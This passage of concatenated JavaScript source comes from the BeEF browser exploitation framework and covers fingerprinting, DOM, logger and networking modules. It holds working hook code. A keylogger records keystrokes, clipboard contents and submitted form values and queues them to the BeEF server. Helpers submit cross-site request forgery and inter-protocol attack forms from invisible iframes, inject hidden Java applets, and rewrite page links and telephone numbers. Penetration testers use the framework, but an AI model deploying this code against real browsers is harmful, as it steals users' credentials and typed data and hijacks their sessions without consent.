		if(this.isMacintosh()) {
			if (this.isOsxYosemite())        return '10.10';
			if (this.isOsxMavericks())       return '10.9';
			if (this.isOsxSnowLeopard())     return '10.8';
			if (this.isOsxLeopard())         return '10.7';
		}

		// TODO add Android/iOS version detection
	}
};

beef.regCmp('beef.net.os');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.hardware = {

  ua: navigator.userAgent,

  /*
   * @return: {String} CPU type
   **/
  cpuType: function() {
    var arch = 'UNKNOWN';
    // note that actually WOW64 means IE 32bit and Windows 64 bit. we are more interested
    // in detecting the OS arch rather than the browser build
    if (navigator.userAgent.match('(WOW64|x64|x86_64)') || navigator.platform.toLowerCase() == "win64"){
      arch = 'x86_64';
    }else if(typeof navigator.cpuClass != 'undefined'){
      switch (navigator.cpuClass) {
        case '68K':
          arch = 'Motorola 68K';
          break;
        case 'PPC':
          arch = 'Motorola PPC';
          break;
        case 'Digital':
          arch = 'Alpha';
          break;
        default:
          arch = 'x86';
      }
    }
    // TODO we can infer the OS is 64 bit, if we first detect the OS type (os.js).
    // For example, if OSX is at least 10.7, most certainly is 64 bit.
    return arch;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isTouchEnabled: function() {
    if ('ontouchstart' in document) return true;
    return false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isVirtualMachine: function() {
    if (screen.width % 2 || screen.height % 2) return true;
    return false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isLaptop: function() {
    // Most common laptop screen resolution
    if (screen.width == 1366 && screen.height == 768) return true;
    // Netbooks
    if (screen.width == 1024 && screen.height == 600) return true;
    return false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isNokia: function() {
    return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isZune: function() {
    return (this.ua.match('ZuneWP7')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isHtc: function() {
    return (this.ua.match('HTC')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isEricsson: function() {
    return (this.ua.match('Ericsson')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isMotorola: function() {
    return (this.ua.match('Motorola')) ? true : false;
  },

  /*
   * @return: {Boolean} true or false.
   **/
  isGoogle: function() {
    return (this.ua.match('Nexus One')) ? true : false;
  },

  /**
   * Returns true if the browser is on a Mobile Phone
   * @return: {Boolean} true or false
   *
   * @example: if(beef.hardware.isMobilePhone()) { ... }
   **/
  isMobilePhone: function() {
    return DetectMobileQuick();
  },

  getName: function() {
    var ua = navigator.userAgent.toLowerCase();
    if(DetectIphone())              { return "iPhone"};
    if(DetectIpod())                { return "iPod Touch"};
    if(DetectIpad())                { return "iPad"};
    if (this.isHtc())               { return 'HTC'};
    if (this.isMotorola())          { return 'Motorola'};
    if (this.isZune())              { return 'Zune'};
    if (this.isGoogle())            { return 'Google Nexus One'};
    if (this.isEricsson())          { return 'Ericsson'};
    if(DetectAndroidPhone())        { return "Android Phone"};
    if(DetectAndroidTablet())       { return "Android Tablet"};
    if(DetectS60OssBrowser())       { return "Nokia S60 Open Source"};
    if(ua.search(deviceS60) > -1)   { return "Nokia S60"};
    if(ua.search(deviceS70) > -1)   { return "Nokia S70"};
    if(ua.search(deviceS80) > -1)   { return "Nokia S80"};
    if(ua.search(deviceS90) > -1)   { return "Nokia S90"};
    if(ua.search(deviceSymbian) > -1)   { return "Nokia Symbian"};
    if (this.isNokia())             { return 'Nokia'};
    if(DetectWindowsPhone7())       { return "Windows Phone 7"};
    if(DetectWindowsMobile())       { return "Windows Mobile"};
    if(DetectBlackBerryTablet())    { return "BlackBerry Tablet"};
    if(DetectBlackBerryWebKit())    { return "BlackBerry OS 6"};
    if(DetectBlackBerryTouch())     { return "BlackBerry Touch"};
    if(DetectBlackBerryHigh())      { return "BlackBerry OS 5"};
    if(DetectBlackBerry())          { return "BlackBerry"};
    if(DetectPalmOS())              { return "Palm OS"};
    if(DetectPalmWebOS())           { return "Palm Web OS"};
    if(DetectGarminNuvifone())      { return "Gamin Nuvifone"};
    if(DetectArchos())              { return "Archos"}
    if(DetectBrewDevice())          { return "Brew"};
    if(DetectDangerHiptop())        { return "Danger Hiptop"};
    if(DetectMaemoTablet())         { return "Maemo Tablet"};
    if(DetectSonyMylo())            { return "Sony Mylo"};
    if(DetectAmazonSilk())          { return "Kindle Fire"};
    if(DetectKindle())              { return "Kindle"};
    if(DetectSonyPlaystation())                 { return "Playstation"};
    if(ua.search(deviceNintendoDs) > -1)        { return "Nintendo DS"};
    if(ua.search(deviceWii) > -1)               { return "Nintendo Wii"};
    if(ua.search(deviceNintendo) > -1)          { return "Nintendo"};
    if(DetectXbox())                            { return "Xbox"};
    if(this.isLaptop())                         { return "Laptop"};
    if(this.isVirtualMachine())                 { return "Virtual Machine"};

    return 'Unknown';
  }
};

beef.regCmp('beef.hardware');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.dom
 *
 * Provides functionality to manipulate the DOM.
 */
beef.dom = {
	
	/**
	 * Generates a random ID for HTML elements
	 * @param: {String} prefix: a custom prefix before the random id. defaults to "beef-"
	 * @return: generated id
	 */
	generateID: function(prefix) {
		return ((prefix == null) ? 'beef-' : prefix)+Math.floor(Math.random()*99999);
	},	
		
	/**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		
		return el;
	},
	
	/**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
	removeElement: function(el) {
		if (!beef.dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	
	/**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	
	/**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		
		document.body.appendChild(iframe);
		
		return iframe;
	},

	/**
	 * Returns the highest current z-index
	 * @param: {Boolean} whether to return an associative array with the height AND the ID of the element
	 * @return: {Integer} Highest z-index in the DOM
	 * OR
	 * @return: {Hash} A hash with the height and the ID of the highest element in the DOM {'height': INT, 'elem': STRING}
	 */
	getHighestZindex: function(include_id) {
		var highest = {'height':0, 'elem':''};
		$j('*').each(function() {
			var current_high = parseInt($j(this).css("zIndex"),10);
			if (current_high > highest.height) {
				highest.height = current_high;
				highest.elem = $j(this).attr('id');
			}
		});

		if (include_id) {
			return highest;
		} else {
			return highest.height;
		}
	},
	
	/**
     * Create an iFrame element and prepend to document body. URI passed via 'src' property of function's 'params' parameter
     * is assigned to created iframe tag's src attribute resulting in GET request to that URI.
     * example usage in the code: beef.dom.createIframe('fullscreen', {'src':$j(this).attr('href')}, {}, null);
	 * @param: {String} type: can be 'hidden' or 'fullScreen'. defaults to normal
	 * @param: {Hash} params: list of params that will be sent in request.
	 * @param: {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
	 * @param: {Function} a callback function to fire once the iFrame has loaded
	 * @return: {Object} the inserted iFrame
     *
	 */
	createIframe: function(type, params, styles, onload) {
		var css = {};

		if (type == 'hidden') {
			css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles);
		} else if (type == 'fullscreen') {
			css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px', 'z-index':beef.dom.getHighestZindex()+1}, styles);
			$j('body').css({'padding':'0px', 'margin':'0px'});
		} else {
			css = styles;
			$j('body').css({'padding':'0px', 'margin':'0px'});
		}
		var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');
		
		return iframe;
	},

    /**
     * Load the link (href value) in an overlay foreground iFrame.
     * The BeEF hook continues to run in background.
     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
     * Framebusting techniques, this will not work.
     */
    persistentIframe: function(){
        $j('a').click(function(e) {
            if ($j(this).attr('href') != '')
            {
                e.preventDefault();
                beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
                $j(document).attr('title', $j(this).html());
                document.body.scroll = "no";
                document.documentElement.style.overflow = 'hidden';
            }
        });
    },

    /**
     * Load a full screen div that is black, or, transparent
     * @param: {Boolean} vis: whether or not you want the screen dimmer enabled or not
     * @param: {Hash} options: a collection of options to customise how the div is configured, as follows:
     *         opacity:0-100         // Lower number = less grayout higher = more of a blackout
     *           // By default this is 70 
     *         zindex: #             // HTML elements with a higher zindex appear on top of the gray out
     *           // By default this will use beef.dom.getHighestZindex to always go to the top
     *         bgcolor: (#xxxxxx)    // Standard RGB Hex color code
     *           // By default this is #000000
     */
	grayOut: function(vis, options) {
	  // in any order.  Pass only the properties you need to set.
	  var options = options || {};
	  var zindex = options.zindex || beef.dom.getHighestZindex()+1;
	  var opacity = options.opacity || 70;
	  var opaque = (opacity / 100);
	  var bgcolor = options.bgcolor || '#000000';
	  var dark=document.getElementById('darkenScreenObject');
	  if (!dark) {
	    // The dark layer doesn't exist, it's never been created.  So we'll
	    // create it here and apply some basic styles.
	    // If you are getting errors in IE see: http://support.microsoft.com/default.aspx/kb/927917
	    var tbody = document.getElementsByTagName("body")[0];
	    var tnode = document.createElement('div');           // Create the layer.
	        tnode.style.position='absolute';                 // Position absolutely
	        tnode.style.top='0px';                           // In the top
	        tnode.style.left='0px';                          // Left corner of the page
	        tnode.style.overflow='hidden';                   // Try to avoid making scroll bars            
	        tnode.style.display='none';                      // Start out Hidden
	        tnode.id='darkenScreenObject';                   // Name it so we can find it later
	    tbody.appendChild(tnode);                            // Add it to the web page
	    dark=document.getElementById('darkenScreenObject');  // Get the object.
	  }
	  if (vis) {
	    // Calculate the page width and height 
	    if( document.body && ( document.body.scrollWidth || document.body.scrollHeight ) ) {
	        var pageWidth = document.body.scrollWidth+'px';
	        var pageHeight = document.body.scrollHeight+'px';
	    } else if( document.body.offsetWidth ) {
	      var pageWidth = document.body.offsetWidth+'px';
	      var pageHeight = document.body.offsetHeight+'px';
	    } else {
	       var pageWidth='100%';
	       var pageHeight='100%';
	    }
	    //set the shader to cover the entire page and make it visible.
	    dark.style.opacity=opaque;
	    dark.style.MozOpacity=opaque;
	    dark.style.filter='alpha(opacity='+opacity+')';
	    dark.style.zIndex=zindex;
	    dark.style.backgroundColor=bgcolor;
	    dark.style.width= pageWidth;
	    dark.style.height= pageHeight;
	    dark.style.display='block';
	  } else {
	     dark.style.display='none';
	  }
	},

	/**
	 * Remove all external and internal stylesheets from the current page - sometimes prior to socially engineering,
	 *  or, re-writing a document this is useful.
	 */
	removeStylesheets: function() {
		$j('link[rel=stylesheet]').remove();
		$j('style').remove();
	},
	
	/**
     * Create a form element with the specified parameters, appending it to the DOM if append == true
	 * @param: {Hash} params: params to be applied to the form element
	 * @param: {Boolean} append: automatically append the form to the body
	 * @return: {Object} a form object
	 */
	createForm: function(params, append) {
		var form = $j('<form></form>').attr(params);
		if (append)
			$j('body').append(form);
		return form;
	},
	
	/**
	 * Get the location of the current page.
	 * @return: the location.
	 */
	getLocation: function() {
		return document.location.href;
	},
	
	/**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	},
	
	/**
	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinks: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $j(sel).each(function() {
			if ($j(this).attr('href') != null)
			{
				$j(this).attr('href', url).click(function() { return true; });
			}
		}).length;
	},

	/**
	 * Rewrites all links matched by selector to url, leveraging Bilawal Hameed's hidden click event overwriting.
	 * http://bilaw.al/2013/03/17/hacking-the-a-tag-in-100-characters.html
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksClickEvents: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $j(sel).each(function() {
			if ($j(this).attr('href') != null)
			{
				$j(this).click(function() {this.href=url});
			}
		}).length;
	},

	/**
     * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
	 * @param: {String} old_protocol: the old link protocol to be rewritten
	 * @param: {String} new_protocol: the new link protocol to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {

		var count = 0;
		var re = new RegExp(old_protocol+"://", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$j(sel).each(function() {
			if ($j(this).attr('href') != null) {
				var url = $j(this).attr('href');
				if (url.match(re)) {
					$j(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

	/**
	 * Parse all links in the page matched by the selector, replacing all telephone urls ('tel' protocol handler) with a new telephone number
	 * @param: {String} new_number: the new link telephone number to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteTelLinks: function(new_number, selector) {

		var count = 0;
		var re = new RegExp("tel:/?/?.*", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$j(sel).each(function() {
			if ($j(this).attr('href') != null) {
				var url = $j(this).attr('href');
				if (url.match(re)) {
					$j(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

    /**
     *  Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
     * @params: {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
     * @return: {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
     */
    parseAppletParams: function(params){
         var result = '';
         for (i in params){
           var param = params[i];
           for(key in param){
              result += "<param name='" + key + "' value='" + param[key] + "' />";
           }
         }
        return result;
    },

    /**
     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
     * example usage in the code, using a JAR archive (recommended and faster):
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
     * example usage in the code, using codebase:
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
     * @params: {String} id: reference identifier to the applet.
     * @params: {String} code: name of the class to be loaded. For example, beef.class.
     * @params: {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
     * @params: {String} archive: the jar that contains the code.
     * @params: {String} params: an array of additional params that the applet except.
     */
    attachApplet: function(id, name, code, codebase, archive, params) {
        var content = null;
        if (beef.browser.isIE()) {
            content = "" + // the classid means 'use the latest JRE available to launch the applet'
                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
                "height='0' width='0' name='" + name + "'> " +
                "<param name='code' value='" + code + "' />";

            if (codebase != null) {
                content += "<param name='codebase' value='" + codebase + "' />"
            }
            if (archive != null){
                content += "<param name='archive' value='" + archive + "' />";
            }
            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</object>";
        }
        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO() || beef.browser.isFF()) {

            if (codebase != null) {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</applet>";
        }
        // For some reasons JavaPaylod is not working if the applet is attached to the DOM with the embed tag rather than the applet tag.
//        if (beef.browser.isFF()) {
//            if (codebase != null) {
//                content = "" +
//                    "<embed id='" + id + "' code='" + code + "' " +
//                    "type='application/x-java-applet' codebase='" + codebase + "' " +
//                    "height='0' width='0' name='" + name + "'>";
//            } else {
//                content = "" +
//                    "<embed id='" + id + "' code='" + code + "' " +
//                    "type='application/x-java-applet' archive='" + archive + "' " +
//                    "height='0' width='0' name='" + name + "'>";
//            }
//
//            if (params != null) {
//                content += beef.dom.parseAppletParams(params);
//            }
//            content += "</embed>";
//        }
        $j('body').append(content);
    },

    /**
     * Given an id, remove the applet from the DOM.
     * @params: {String} id: reference identifier to the applet.
     */
    detachApplet: function(id) {
        $j('#' + id + '').detach();
    },

    /**
     * Create an invisible iFrame with a form inside, and submit it. Useful for XSRF attacks delivered via POST requests.
     * @params: {String} action: the form action attribute, where the request will be sent.
     * @params: {String} method: HTTP method, usually POST.
     * @params: {String} enctype: form encoding type
     * @params: {Array} inputs: an array of inputs to be added to the form (type, name, value).
     *         example: [{'type':'hidden', 'name':'1', 'value':''} , {'type':'hidden', 'name':'2', 'value':'3'}]
     */
    createIframeXsrfForm: function(action, method, enctype, inputs){
        var iframeXsrf = beef.dom.createInvisibleIframe();

        var formXsrf = document.createElement('form');
        formXsrf.setAttribute('action',  action);
        formXsrf.setAttribute('method',  method);
        formXsrf.setAttribute('enctype', enctype);

        var input = null;
        for (i in inputs){
            var attributes = inputs[i];
            input = document.createElement('input');
                for(key in attributes){
                    input.setAttribute(key, attributes[key]);
                }
            formXsrf.appendChild(input);
        }
        iframeXsrf.contentWindow.document.body.appendChild(formXsrf);
        formXsrf.submit();

        return iframeXsrf;
    },

    /**
     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
     * @params: {String} rhost: remote host ip/domain
     * @params: {String} rport: remote port
     * @params: {String} commands: protocol commands to be executed by the remote host:port service
     */
    createIframeIpecForm: function(rhost, rport, path, commands){
        var iframeIpec = beef.dom.createInvisibleIframe();

        var formIpec = document.createElement('form');
        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+path);
        formIpec.setAttribute('method',  'POST');
        formIpec.setAttribute('enctype', 'multipart/form-data');

        input = document.createElement('textarea');
        input.setAttribute('name', Math.random().toString(36).substring(5));
        input.value = commands;
        formIpec.appendChild(input);
        iframeIpec.contentWindow.document.body.appendChild(formIpec);
        formIpec.submit();

        return iframeIpec;
    }

};

beef.regCmp('beef.dom');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.logger
 *
 * Provides logging capabilities.
 */
beef.logger = {
	
	running: false,
    /**
    * Internal logger id
    */
    id: 0,
	/**
	 * Holds events created by user, to be sent back to BeEF
	 */
	events: [],
	/**
	 * Holds current stream of key presses
	 */
	stream: [],
	/**
	 * Contains current target of key presses
	 */
	target: null,
	/**
	 * Holds the time the logger was started
	 */
	time: null,
    /**
    * Holds the event details to be sent to BeEF
    */
    e: function() {
        this.id = beef.logger.get_id();
        this.time = beef.logger.get_timestamp();
        this.type = null;
        this.x = 0;
        this.y = 0;
        this.target = null;
        this.data = null;
        this.mods = null;
    },
	
	/**
	 * Starts the logger
	 */
	start: function() {

		beef.browser.hookChildFrames();
		this.running = true;
		var d = new Date();
		this.time = d.getTime();

		$j(document).keypress(
			function(e) { beef.logger.keypress(e); }
		).click(
			function(e) { beef.logger.click(e); }
		);
		$j(window).focus(
			function(e) { beef.logger.win_focus(e); }
		).blur(
			function(e) { beef.logger.win_blur(e); }
		);
		$j('form').submit(
			function(e) { beef.logger.submit(e); }
		);
		document.body.oncopy = function() {
			setTimeout("beef.logger.copy();", 10);
		};
		document.body.oncut = function() {
			setTimeout("beef.logger.cut();", 10);
		};
		document.body.onpaste = function() {
			beef.logger.paste();
		}
	},
	
	/**
	 * Stops the logger
	 */
	stop: function() {
		this.running = false;
		clearInterval(this.timer);
		$j(document).keypress(null);
	},

    /**
    * Get id
    */
    get_id: function() {
        this.id++;
        return this.id;
    },

	/**
	 * Click function fires when the user clicks the mouse.
	 */
	click: function(e) {
        var c = new beef.logger.e();
        c.type = 'click';
        c.x = e.pageX;
        c.y = e.pageY;
        c.target = beef.logger.get_dom_identifier(e.target);
        this.events.push(c);
	},
	
	/**
	 * Fires when the window element has regained focus
	 */
	win_focus: function(e) {
        var f = new beef.logger.e();
        f.type = 'focus';
        this.events.push(f);
	},
	
	/**
	 * Fires when the window element has lost focus
	 */
	win_blur: function(e) {
        var b = new beef.logger.e();
        b.type = 'blur';
		this.events.push(b);
	},
	
	/**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
	keypress: function(e) {
		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
		{
			beef.logger.push_stream();
			this.target = e.target;
		}
		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
	},
	
	/**
	 * Copy function fires when the user copies data to the clipboard.
	 */
	copy: function(x) {
		try {
			var c = new beef.logger.e();
			c.type = 'copy';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Cut function fires when the user cuts data to the clipboard.
	 */
	cut: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'cut';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Paste function fires when the user pastes data from the clipboard.
	 */
	paste: function() {
		try {
			var c = new beef.logger.e();
			c.type = 'paste';
			c.data = clipboardData.getData("Text");
			this.events.push(c);
		} catch(e) {}
	},

	/**
	 * Submit function fires whenever a form is submitted
     * TODO: Cleanup this function
	 */
	submit: function(e) {
		try {
			var f = new beef.logger.e();
			var values = "";
			f.type = 'submit';
			f.target = beef.logger.get_dom_identifier(e.target);
			for (var i = 0; i < e.target.elements.length; i++) {
	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
	        }
			f.data = 'Action: '+$j(e.target).attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
			this.events.push(f);
		} catch(e) {}
	},
	
	/**
	 * Pushes the current stream to the events queue
	 */
	push_stream: function() {
		if (this.stream.length > 0)
		{
			this.events.push(beef.logger.parse_stream());
			this.stream = [];
		}
	},
	
	/**
	 * Translate DOM Object to a readable string
	 */
	get_dom_identifier: function(target) {
		target = (target == null) ? this.target : target;
		var id = '';
		if (target)
		{
			id = target.tagName.toLowerCase();
			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
		}
		return id;
	},
	
	/**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
	get_timestamp: function() {
		var d = new Date();
		return ((d.getTime() - this.time) / 1000).toFixed(3);
	},
	
	/**
	 * Parses stream array and creates history string
	 */
	parse_stream: function() {
		var s = '';
        var mods = '';
		for (var i in this.stream){
         try{
            var mod = this.stream[i]['modifiers'];
            s += String.fromCharCode(this.stream[i]['char']);
            if(typeof mod != 'undefined' &&
                      (mod['alt'] == true ||
                      mod['ctrl'] == true ||
                      mod['shift'] == true)){
                mods += (mod['alt']) ? ' [Alt] ' : '';
                mods += (mod['ctrl']) ? ' [Ctrl] ' : '';
                mods += (mod['shift']) ? ' [Shift] ' : '';
                mods += String.fromCharCode(this.stream[i]['char']);
            }

         }catch(e){}
		}
        var k = new beef.logger.e();
        k.type = 'keys';
        k.target = beef.logger.get_dom_identifier();
        k.data = s;
        k.mods = mods;
        return k;
	},
	
	/**
	 * Queue results to be sent back to framework
	 */
	queue: function() {
		beef.logger.push_stream();
		if (this.events.length > 0)
		{
			beef.net.queue('/event', 0, this.events);
			this.events = [];
		}
	}
		
};

beef.regCmp('beef.logger');


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net
 *
 * Provides basic networking functions,
 * like beef.net.request and beef.net.forgeRequest,
 * used by BeEF command modules and the Requester extension,
 * as well as beef.net.send which is used to return commands
 * to BeEF server-side components.
 *
 * Also, it contains the core methods used by the XHR-polling
 * mechanism (flush, queue)
 */
beef.net = {

    host: "SKS_2",
    port: "80",
    hook: "/hook.js",
    httpproto: "http",
    handler: '/dh',
    chop: 500,
    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
    sid_count: 0,
    cmd_queue: [],

    /**
     * Command object. This represents the data to be sent back to BeEF,
     * using the beef.net.send() method.
     */
    command: function () {
        this.cid = null;
        this.results = null;
        this.status = null;
        this.handler = null;
        this.callback = null;
    },

    /**
     * Packet object. A single chunk of data. X packets -> 1 stream
     */
    packet: function () {
        this.id = null;
        this.data = null;
    },

    /**
     * Stream object. Contains X packets, which are command result chunks.
     */
    stream: function () {
        this.id = null;
        this.packets = [];
        this.pc = 0;
        this.get_base_url_length = function () {
            return (this.url + this.handler + '?' + 'bh=' + beef.session.get_hook_session_id()).length;
        };
        this.get_packet_data = function () {
            var p = this.packets.shift();
            return {'bh': beef.session.get_hook_session_id(), 'sid': this.id, 'pid': p.id, 'pc': this.pc, 'd': p.data }
        };
    },

    /**
     * Response Object - used in the beef.net.request callback
     * NOTE: as we are using async mode, the response object will be empty if returned.
     * Using sync mode, request obj fields will be populated.
     */
    response: function () {
        this.status_code = null;        // 500, 404, 200, 302
        this.status_text = null;        // success, timeout, error, ...
        this.response_body = null;      // "<html>â€¦." if not a cross-origin request
        this.port_status = null;        // tcp port is open, closed or not http
        this.was_cross_domain = null;   // true or false
        this.was_timedout = null;       // the user specified timeout was reached
        this.duration = null;           // how long it took for the request to complete
        this.headers = null;            // full response headers
    },

    /**
     * Queues the specified command results.
     * @param: {String} handler: the server-side handler that will be called
     * @param: {Integer} cid: command id
     * @param: {String} results: the data to send
     * @param: {Integer} status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
     * @param: {Function} callback: the function to call after execution
     */
    queue: function (handler, cid, results, status, callback) {
        if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
            var s = new beef.net.command();
            s.cid = cid;
            s.results = beef.net.clean(results);
            s.status = status;
            s.callback = callback;
            s.handler = handler;
            this.cmd_queue.push(s);
        }
    },

    /**
     * Queues the current command results and flushes the queue straight away.
     * NOTE: Always send Browser Fingerprinting results
     * (beef.net.browser_details(); -> /init handler) using normal XHR-polling,
     * even if WebSockets are enabled.
     * @param: {String} handler: the server-side handler that will be called
     * @param: {Integer} cid: command id
     * @param: {String} results: the data to send
     * @param: {Integer} exec_status: the result of the command execution (-1, 0 or 1 for 'error', 'unknown' or 'success')
     * @param: {Function} callback: the function to call after execution
     * @return: {Integer} exec_status: the command module execution status (defaults to 0 - 'unknown' if status is null)
     */
    send: function (handler, cid, results, exec_status, callback) {
        // defaults to 'unknown' execution status if no parameter is provided, otherwise set the status
        var status = 0;
        if (exec_status != null && parseInt(Number(exec_status)) == exec_status){ status = exec_status}

        if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
            this.queue(handler, cid, results, status, callback);
            this.flush();
        } else {
            try {
                beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
                    '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
                    '", "status": "' + exec_status +
                    '", "callback": "' + callback +
                    '","bh":"' + beef.session.get_hook_session_id() + '" }');
            } catch (e) {
                this.queue(handler, cid, results, status, callback);
                this.flush();
            }
        }

        return status;
    },

    /**
     * Flush all currently queued command results to the framework,
     * chopping the data in chunks ('chunk' method) which will be re-assembled
     * server-side by the network stack.
     * NOTE: currently 'flush' is used only with the default
     * XHR-polling mechanism. If WebSockets are used, the data is sent
     * back to BeEF straight away.
     */
    flush: function () {
        if (this.cmd_queue.length > 0) {
            var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
            this.cmd_queue.length = 0;
            this.sid_count++;
            var stream = new this.stream();
            stream.id = this.sid_count;
            var pad = stream.get_base_url_length() + this.pad;
            //cant continue if chop amount is too low
            if ((this.chop - pad) > 0) {
                var data = this.chunk(data, (this.chop - pad));
                for (var i = 1; i <= data.length; i++) {
                    var packet = new this.packet();
                    packet.id = i;
                    packet.data = data[(i - 1)];
                    stream.packets.push(packet);
                }
                stream.pc = stream.packets.length;
                this.push(stream);
            }
        }
    },

    /**
     * Split the input data into chunk lengths determined by the amount parameter.
     * @param: {String} str: the input data
     * @param: {Integer} amount: chunk length
     */
    chunk: function (str, amount) {
        if (typeof amount == 'undefined') n = 2;
        return str.match(RegExp('.{1,' + amount + '}', 'g'));
    },

    /**
     * Push the input stream back to the BeEF server-side components.
     * It uses beef.net.request to send back the data.
     * @param: {Object} stream: the stream object to be sent back.
